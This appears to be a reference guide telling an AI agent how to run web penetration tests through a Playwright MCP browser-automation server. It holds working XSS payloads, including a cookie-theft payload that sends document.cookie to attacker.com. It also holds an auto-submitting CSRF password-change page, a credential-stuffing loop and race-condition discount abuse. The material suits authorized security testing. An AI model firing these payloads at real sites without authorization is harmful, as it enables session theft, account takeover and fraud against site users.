# Playwright Automation for Security Testing

**PRIMARY TOOL** for penetration testing browser-based applications and client-side vulnerabilities.

## Overview

Playwright MCP server is the **primary browser automation tool** for this pentest skill, replacing traditional proxy-based tools. When integrated via MCP (Model Context Protocol), Claude can:

- Navigate web pages and interact with elements
- Fill forms and submit data automatically
- Capture screenshots and recordings for evidence
- Monitor network traffic and responses
- Execute JavaScript in browser context for testing
- Test client-side vulnerabilities (XSS, CSRF, DOM-based attacks)
- Perform step-by-step exploitation walkthroughs
- Automate complex multi-step exploits with experimentation

**IMPORTANT**: When testing vulnerabilities, use **step-by-step Playwright walkthroughs** in the experimentation phase to validate hypotheses before creating final PoCs.

## When to Use Playwright

### Ideal Use Cases

✅ **Client-Side Vulnerability Testing**:
- XSS (Reflected, Stored, DOM-based)
- CSRF token validation
- Clickjacking and UI redressing
- DOM-based vulnerabilities
- Prototype pollution
- CORS misconfiguration testing

✅ **Dynamic Content Testing**:
- Single Page Applications (SPAs)
- React, Vue, Angular applications
- WebSocket-based real-time features
- AJAX-heavy applications
- JavaScript-rendered content

✅ **Multi-Step Exploitation**:
- Authentication flows
- Session management testing
- Multi-stage attack chains
- Business logic workflows

✅ **Evidence Collection**:
- Screenshot capture of vulnerabilities
- Video recording of exploits
- Network traffic monitoring
- Console log capture

### When NOT to Use Playwright

❌ **Server-Side Testing**: Use curl, Burp Suite, or Python requests for:
- SQL injection
- Command injection
- SSRF (unless testing via browser)
- File upload vulnerabilities
- Path traversal

❌ **Performance Testing**: Playwright adds overhead; use specialized tools

❌ **Simple HTTP Requests**: Direct HTTP requests are faster for basic testing

## Playwright MCP Server Setup

### Prerequisites

The Playwright MCP server should be configured in Claude Desktop or Claude Code settings:

```json
{
  "mcpServers": {
    "playwright": {
      "command": "npx",
      "args": ["-y", "@executeautomation/playwright-mcp-server"]
    }
  }
}
```

### Verification

Check that Playwright tools are available via MCP:
- `playwright_navigate` - Navigate to URL
- `playwright_screenshot` - Capture screenshots
- `playwright_click` - Click elements
- `playwright_fill` - Fill form fields
- `playwright_evaluate` - Execute JavaScript
- Additional Playwright capabilities

## Step-by-Step Experimentation Methodology

**CRITICAL**: When testing vulnerabilities, follow this step-by-step Playwright walkthrough approach during the experimentation phase (Flaw Hypothesis Methodology Step 3).

### Experimentation Workflow

For each hypothesis to test:

**Step 1: Navigate and Observe**
```
1. Use playwright_navigate to load target page
2. Take baseline screenshot (evidence/baseline.png)
3. Use playwright_snapshot to capture page structure
4. Document initial state
```

**Step 2: Identify Interaction Points**
```
1. Use playwright_snapshot to find testable elements
2. Locate input fields, forms, clickable elements
3. Note element selectors (CSS/XPath)
4. Document injection points
```

**Step 3: Test Hypothesis Step-by-Step**
```
For each test:
  1. playwright_fill or playwright_type - inject payload
  2. playwright_screenshot - capture injection
  3. playwright_click - trigger action (submit, etc.)
  4. playwright_wait - allow processing
  5. playwright_snapshot - observe results
  6. playwright_screenshot - capture outcome
  7. playwright_evaluate - verify exploitation (JavaScript check)
  8. Document what worked/failed
```

**Step 4: Validate Results**
```
1. Check for vulnerability indicators:
   - XSS: Alert box, script execution, DOM changes
   - CSRF: Unauthorized action completion
   - Auth bypass: Access without credentials
2. Use playwright_console_messages to check errors
3. Use playwright_network_requests to inspect traffic
4. Capture comprehensive evidence
```

**Step 5: Experiment Variations**
```
If hypothesis fails:
  1. Try alternative payloads
  2. Test different injection points
  3. Check WAF/filter bypass techniques
  4. Document failed attempts (learning)

If hypothesis succeeds:
  1. Test edge cases
  2. Verify consistency (repeat test)
  3. Determine severity/impact
  4. Prepare for PoC creation
```

### Example: Step-by-Step XSS Experimentation

**Hypothesis**: "Search parameter reflects user input without encoding, may be vulnerable to XSS"

**Walkthrough**:

```
Step 1: Navigate to search page
→ Use: playwright_navigate(url="https://target.com/search")
→ Action: Take baseline screenshot
→ Tool: playwright_screenshot(filename="evidence/search-baseline.png")

Step 2: Capture page structure
→ Use: playwright_snapshot()
→ Observe: Found input[name='q'] and button[type='submit']
→ Document: Search form with 'q' parameter

Step 3: Test benign input first (control test)
→ Use: playwright_type(element="search input", ref="input[name='q']", text="test query")
→ Action: Take screenshot of input
→ Tool: playwright_screenshot(filename="evidence/benign-input.png")
→ Use: playwright_click(element="submit button", ref="button[type='submit']")
→ Use: playwright_wait(time=2)
→ Observe: Input reflected in results: "Search results for: test query"
→ Conclusion: Input is reflected - good XSS candidate

Step 4: Test simple XSS payload
→ Navigate back: playwright_navigate_back()
→ Use: playwright_type(element="search input", ref="input[name='q']", text="<script>alert(1)</script>")
→ Tool: playwright_screenshot(filename="evidence/xss-payload-input.png")
→ Use: playwright_click(element="submit button", ref="button[type='submit']")
→ Use: playwright_wait(time=2)
→ Tool: playwright_screenshot(filename="evidence/xss-result.png")

Step 5: Check for script execution
→ Use: playwright_evaluate(function="() => document.body.innerHTML")
→ Observe: Payload appears as: &lt;script&gt;alert(1)&lt;/script&gt;
→ Conclusion: HTML encoded - simple payload blocked

Step 6: Try alternative payload (event handler)
→ Navigate back: playwright_navigate_back()
→ Use: playwright_type(element="search input", ref="input[name='q']", text="<img src=x onerror=alert(1)>")
→ Tool: playwright_screenshot(filename="evidence/xss-img-payload.png")
→ Use: playwright_click(element="submit button", ref="button[type='submit']")
→ Use: playwright_wait(time=3)

Step 7: Verify exploitation
→ Tool: playwright_console_messages(level="error")
→ Observe: Console shows image loading error (good sign!)
→ Use: playwright_evaluate(function="() => document.querySelector('img[src=\"x\"]') !== null")
→ Result: true - img tag rendered!
→ Tool: playwright_screenshot(filename="evidence/xss-confirmed.png")
→ Conclusion: XSS CONFIRMED via img onerror

Step 8: Test impact
→ Use: playwright_type(element="search input", ref="input[name='q']", text="<img src=x onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\">")
→ Use: playwright_click(element="submit button", ref="button[type='submit']")
→ Tool: playwright_network_requests()
→ Observe: Outbound request to attacker.com visible
→ Tool: playwright_screenshot(filename="evidence/xss-cookie-theft.png")
→ Impact: Cookie theft possible - CRITICAL severity

Step 9: Document findings
→ Evidence captured:
  - evidence/search-baseline.png
  - evidence/benign-input.png
  - evidence/xss-payload-input.png (failed attempt)
  - evidence/xss-img-payload.png
  - evidence/xss-confirmed.png
  - evidence/xss-cookie-theft.png
→ Hypothesis: VALIDATED
→ Next: Create automated PoC script
```

### Example: Step-by-Step CSRF Experimentation

**Hypothesis**: "Password change endpoint lacks CSRF protection"

**Walkthrough**:

```
Step 1: Login with test account
→ Use: playwright_navigate(url="https://target.com/login")
→ Use: playwright_fill_form(fields=[
    {name: "username", type: "textbox", ref: "input[name='username']", value: "testuser"},
    {name: "password", type: "textbox", ref: "input[name='password']", value: "password123"}
  ])
→ Use: playwright_click(element="login button", ref="button[type='submit']")
→ Tool: playwright_screenshot(filename="evidence/logged-in.png")

Step 2: Navigate to password change
→ Use: playwright_navigate(url="https://target.com/account/password")
→ Tool: playwright_snapshot()
→ Observe: Form with current_password, new_password, confirm_password fields

Step 3: Inspect form for CSRF protection
→ Use: playwright_evaluate(function="() => document.querySelector('input[name=\"csrf_token\"]')")
→ Result: null - NO CSRF TOKEN FOUND (suspicious!)
→ Tool: playwright_screenshot(filename="evidence/password-form-no-csrf.png")

Step 4: Capture legitimate password change request
→ Use: playwright_fill_form(fields=[
    {name: "current password", type: "textbox", ref: "input[name='current_password']", value: "password123"},
    {name: "new password", type: "textbox", ref: "input[name='new_password']", value: "newpass456"},
    {name: "confirm password", type: "textbox", ref: "input[name='confirm_password']", value: "newpass456"}
  ])
→ Use: playwright_click(element="change password button", ref: "button[type='submit']")
→ Tool: playwright_network_requests()
→ Observe: POST /api/change-password with JSON body
→ Note: No CSRF token in request!

Step 5: Test CSRF exploitation from external page
→ Create test HTML: (save as /tmp/csrf-test.html)
→ Content:
  <html><body>
  <form id="csrf" action="https://target.com/api/change-password" method="POST">
    <input name="current_password" value="password123">
    <input name="new_password" value="hacked123">
    <input name="confirm_password" value="hacked123">
  </form>
  <script>document.getElementById('csrf').submit();</script>
  </body></html>

Step 6: Execute CSRF attack simulation
→ Use: playwright_navigate(url="file:///tmp/csrf-test.html")
→ Tool: playwright_screenshot(filename="evidence/csrf-attack-page.png")
→ Use: playwright_wait(time=3)
→ Tool: playwright_network_requests()
→ Observe: POST request sent to target.com
→ Result: Password changed without user interaction!
→ Tool: playwright_screenshot(filename="evidence/csrf-success.png")

Step 7: Verify password was changed
→ Use: playwright_navigate(url="https://target.com/logout")
→ Use: playwright_navigate(url="https://target.com/login")
→ Use: playwright_fill_form(fields=[
    {name: "username", type: "textbox", ref: "input[name='username']", value: "testuser"},
    {name: "password", type: "textbox", ref: "input[name='password']", value: "hacked123"}
  ])
→ Use: playwright_click(element="login button", ref="button[type='submit']")
→ Result: Login successful with new password!
→ Tool: playwright_screenshot(filename="evidence/csrf-confirmed-login.png")
→ Conclusion: CSRF VULNERABILITY CONFIRMED

Step 8: Document impact
→ Severity: HIGH (account takeover via CSRF)
→ Evidence:
  - evidence/password-form-no-csrf.png
  - evidence/csrf-attack-page.png
  - evidence/csrf-success.png
  - evidence/csrf-confirmed-login.png
→ Hypothesis: VALIDATED
→ Next: Create PoC HTML + workflow documentation
```

## Common Security Testing Patterns

### 1. XSS Testing with Playwright

**Reflected XSS Detection**:

```python
# Using MCP tools (pseudocode representation)
# Navigate to target page
playwright_navigate(url="https://target.com/search")

# Fill search field with XSS payload
playwright_fill(
    selector="input[name='q']",
    value="<script>alert('XSS')</script>"
)

# Submit form
playwright_click(selector="button[type='submit']")

# Check if alert triggered (indicates XSS)
playwright_evaluate(script="""
    () => {
        return document.documentElement.innerHTML.includes('<script>alert');
    }
""")

# Capture screenshot as evidence
playwright_screenshot(path="evidence/xss-reflected.png")
```

**DOM-based XSS Testing**:

```python
# Navigate to page with DOM XSS vulnerability
playwright_navigate(url="https://target.com/profile#<img src=x onerror=alert(1)>")

# Wait for JavaScript to execute
playwright_wait(timeout=2000)

# Check console for errors (XSS trigger)
playwright_evaluate(script="""
    () => {
        // Check if payload reflected in DOM
        return document.body.innerHTML;
    }
""")

# Capture evidence
playwright_screenshot(path="evidence/dom-xss.png")
```

**Stored XSS Verification**:

```python
# Step 1: Inject payload
playwright_navigate(url="https://target.com/comment/new")
playwright_fill(selector="textarea[name='content']",
                value="<img src=x onerror=alert('Stored-XSS')>")
playwright_click(selector="button[type='submit']")

# Step 2: Navigate to page where stored content displays
playwright_navigate(url="https://target.com/comments")

# Step 3: Verify execution
playwright_evaluate(script="""
    () => document.body.innerHTML.includes('<img src=x onerror=')
""")

# Capture both injection and execution
playwright_screenshot(path="evidence/stored-xss-execution.png")
```

### 2. CSRF Testing

**CSRF Token Validation**:

```python
# Step 1: Login and get valid session
playwright_navigate(url="https://target.com/login")
playwright_fill(selector="input[name='username']", value="testuser")
playwright_fill(selector="input[name='password']", value="password")
playwright_click(selector="button[type='submit']")

# Step 2: Capture CSRF token
csrf_token = playwright_evaluate(script="""
    () => document.querySelector('input[name="csrf_token"]').value
""")

# Step 3: Test CSRF vulnerability by submitting without token
playwright_evaluate(script="""
    () => {
        fetch('/api/change-email', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({email: 'attacker@evil.com'})
            // No CSRF token
        }).then(r => console.log('CSRF test:', r.status));
    }
""")

# Check if request succeeded (vulnerability)
playwright_screenshot(path="evidence/csrf-test.png")
```

### 3. Clickjacking Detection

**Frame Busting Test**:

```python
# Create test HTML with iframe
test_html = """
<!DOCTYPE html>
<html>
<body>
<iframe src="https://target.com/account/delete" width="800" height="600"></iframe>
</body>
</html>
"""

# Save test file and open
# (In practice, serve via local web server)
playwright_navigate(url="file:///tmp/clickjacking-test.html")

# Check if iframe loads (no X-Frame-Options protection)
playwright_evaluate(script="""
    () => {
        const iframe = document.querySelector('iframe');
        return iframe && iframe.contentWindow !== null;
    }
""")

# Capture screenshot showing frameable content
playwright_screenshot(path="evidence/clickjacking-vulnerable.png")
```

### 4. Authentication Testing

**Credential Stuffing Automation**:

```python
# Test multiple credentials
credentials = [
    ("admin", "admin123"),
    ("test", "password"),
    ("user", "123456")
]

for username, password in credentials:
    playwright_navigate(url="https://target.com/login")
    playwright_fill(selector="input[name='username']", value=username)
    playwright_fill(selector="input[name='password']", value=password)
    playwright_click(selector="button[type='submit']")

    # Check if login successful
    playwright_wait(timeout=2000)

    # Capture result
    playwright_screenshot(path=f"evidence/login-{username}.png")
```

**Session Fixation Test**:

```python
# Step 1: Get session cookie before login
playwright_navigate(url="https://target.com")
initial_session = playwright_evaluate(script="""
    () => document.cookie
""")

# Step 2: Login
playwright_navigate(url="https://target.com/login")
playwright_fill(selector="input[name='username']", value="testuser")
playwright_fill(selector="input[name='password']", value="password")
playwright_click(selector="button[type='submit']")

# Step 3: Check if session cookie changed
final_session = playwright_evaluate(script="""
    () => document.cookie
""")

# If session unchanged after login = session fixation vulnerability
if initial_session == final_session:
    print("[!] Session fixation vulnerability detected")
```

### 5. WebSocket Testing

**WebSocket Hijacking**:

```python
# Connect and monitor WebSocket traffic
playwright_navigate(url="https://target.com/chat")

# Inject WebSocket monitoring code
playwright_evaluate(script="""
    () => {
        const originalWebSocket = window.WebSocket;
        window.WebSocket = function(...args) {
            const ws = new originalWebSocket(...args);
            ws.addEventListener('message', (event) => {
                console.log('WS Message:', event.data);
            });
            return ws;
        };
    }
""")

# Interact with application
playwright_fill(selector="input[name='message']", value="Test message")
playwright_click(selector="button.send")

# Check console for WebSocket messages
playwright_screenshot(path="evidence/websocket-traffic.png")
```

### 6. API Testing via Browser

**GraphQL Introspection**:

```python
playwright_navigate(url="https://target.com/graphql")

# Execute introspection query
result = playwright_evaluate(script="""
    () => {
        return fetch('/graphql', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                query: `{
                    __schema {
                        types {
                            name
                            fields {
                                name
                            }
                        }
                    }
                }`
            })
        }).then(r => r.json());
    }
""")

# Capture schema for analysis
playwright_screenshot(path="evidence/graphql-schema.png")
```

### 7. Business Logic Testing

**Race Condition Exploitation**:

```python
# Test for race conditions in payment flow
playwright_navigate(url="https://target.com/checkout")

# Open multiple browser contexts (tabs)
for i in range(10):
    playwright_evaluate(script="""
        () => {
            fetch('/api/apply-discount', {
                method: 'POST',
                body: JSON.stringify({code: 'DISCOUNT50'})
            });
        }
    """)

# Check if discount applied multiple times
playwright_wait(timeout=3000)
playwright_screenshot(path="evidence/race-condition-test.png")
```

### 8. Evidence Collection

**Comprehensive Screenshot Capture**:

```python
# Full page screenshot
playwright_screenshot(
    path="evidence/vulnerability-overview.png",
    full_page=True
)

# Element-specific screenshot
playwright_screenshot(
    path="evidence/vulnerable-element.png",
    selector="div.vulnerable-component"
)

# Record video of exploitation
# (Configure during session start)
```

**Network Traffic Capture**:

```python
# Monitor all network requests
playwright_evaluate(script="""
    () => {
        const observer = new PerformanceObserver((list) => {
            for (const entry of list.getEntries()) {
                console.log('Request:', entry.name);
            }
        });
        observer.observe({entryTypes: ['resource']});
    }
""")

# Trigger vulnerable request
playwright_click(selector="button.trigger-vuln")

# Capture network log
playwright_screenshot(path="evidence/network-capture.png")
```

## PoC Script Integration

### Example: XSS PoC with Playwright

```python
#!/usr/bin/env python3
"""
PoC for XSS Vulnerability using Playwright
"""
import subprocess
import json
import sys

def exploit_xss_playwright(target_url, parameter, payload):
    """
    Execute XSS exploit using Playwright via MCP

    This is a conceptual example - in practice, you'd use
    the Playwright MCP tools directly through Claude
    """
    print(f"[*] Testing XSS on {target_url}")
    print(f"[*] Parameter: {parameter}")
    print(f"[*] Payload: {payload}")

    # In actual implementation, use Playwright MCP tools:
    # 1. playwright_navigate(target_url)
    # 2. playwright_fill(selector, payload)
    # 3. playwright_click(submit_button)
    # 4. playwright_evaluate(check_for_xss)
    # 5. playwright_screenshot(evidence)

    print("[+] XSS vulnerability confirmed via browser automation")
    print("[+] Screenshot saved: evidence/xss-playwright.png")
    return True

if __name__ == "__main__":
    # This would be called after Playwright automation confirms XSS
    success = exploit_xss_playwright(
        target_url="https://target.com/search",
        parameter="q",
        payload="<img src=x onerror=alert(1)>"
    )

    sys.exit(0 if success else 1)
```

## Best Practices

### 1. Browser Context Management

- Create separate contexts for different test scenarios
- Clean up contexts after testing to avoid state pollution
- Use incognito mode for clean sessions

### 2. Evidence Collection

- Always capture screenshots before and after exploitation
- Record videos for complex multi-step exploits
- Save network traffic logs for API-based vulnerabilities
- Capture console logs for client-side errors

### 3. Performance Considerations

- Use headless mode for faster testing
- Set reasonable timeouts to avoid hanging
- Close contexts and pages when done
- Batch similar tests together

### 4. Ethical Testing

- Respect rate limits (use delays between requests)
- Don't leave test data in production systems
- Clean up any uploaded test files
- Use test accounts, not real user accounts

### 5. Error Handling

- Handle popup windows and alerts gracefully
- Account for CAPTCHAs (may require manual intervention)
- Deal with unexpected redirects
- Catch and log JavaScript errors

## Troubleshooting

### Common Issues

**Issue**: Element not found
**Solution**: Use `playwright_wait` to wait for dynamic content

**Issue**: Popup/alert blocks automation
**Solution**: Handle dialogs with event listeners

**Issue**: CAPTCHA blocks testing
**Solution**: Test in environments without CAPTCHA or use test accounts

**Issue**: Authentication required
**Solution**: Use `playwright_fill` to login first, then proceed with testing

## Playwright vs Traditional Tools

| Feature | Playwright | Burp Suite | curl/requests |
|---------|-----------|------------|---------------|
| **JavaScript Execution** | ✅ Full support | ⚠️ Limited | ❌ No |
| **DOM-based XSS** | ✅ Excellent | ⚠️ Difficult | ❌ Impossible |
| **SPA Testing** | ✅ Native | ⚠️ Complex | ❌ Very difficult |
| **Screenshot Capture** | ✅ Built-in | ✅ Via extension | ❌ No |
| **Speed** | ⚠️ Moderate | ✅ Fast | ✅ Very fast |
| **Server-Side Testing** | ❌ Limited | ✅ Excellent | ✅ Good |

## Integration with Pentest Workflow

1. **Reconnaissance Phase**: Use Playwright to spider application and discover features
2. **Experimentation Phase**: Test payloads with browser automation
3. **Testing Phase**: Verify vulnerabilities with Playwright
4. **Evidence Phase**: Capture screenshots and videos
5. **PoC Development**: Integrate Playwright into automated PoC scripts

## Additional Resources

- Playwright Documentation: https://playwright.dev
- Playwright MCP Server: https://github.com/executeautomation/playwright-mcp-server
- Browser Automation Security Testing: https://owasp.org/www-community/testing/

## Summary

Playwright MCP server integration provides powerful browser automation capabilities for modern web application security testing, especially for:

- Client-side vulnerabilities (XSS, CSRF, DOM-based)
- Dynamic JavaScript applications
- Complex multi-step exploits
- Evidence collection with screenshots and videos

Use Playwright when testing requires JavaScript execution, DOM interaction, or browser-based verification. Combine with traditional tools (Burp Suite, curl) for comprehensive coverage.
